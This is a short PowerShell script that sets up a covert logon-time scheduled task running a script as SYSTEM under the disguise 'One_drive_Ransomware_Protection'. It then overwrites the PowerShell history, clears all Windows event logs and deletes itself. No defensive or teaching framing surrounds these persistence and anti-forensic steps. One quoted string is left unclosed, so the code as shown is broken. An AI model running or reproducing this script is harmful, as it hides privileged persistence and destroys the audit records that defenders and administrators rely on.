# variables for scheduled task
$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -ExecutionPolicy Bypass -noninteractive -File "C:\Windows\System32\exit.ps1"'
$trigger = New-ScheduledTaskTrigger -AtLogOn
$principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
# register scheduled task
Register-ScheduledTask -TaskName "One_drive_Ransomware_Protection" -Action $action -Trigger $trigger -Principal $principal
# overweite powershell history
Set-Content -Path "C:\Users\$Env:UserName\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Value "Thats not gonna work
# clear event logs
wevtutil el | Foreach-Object {wevtutil cl "$_"}
# self destruct
Remove-Item -Path $MyInvocation.MyCommand.Source -Force
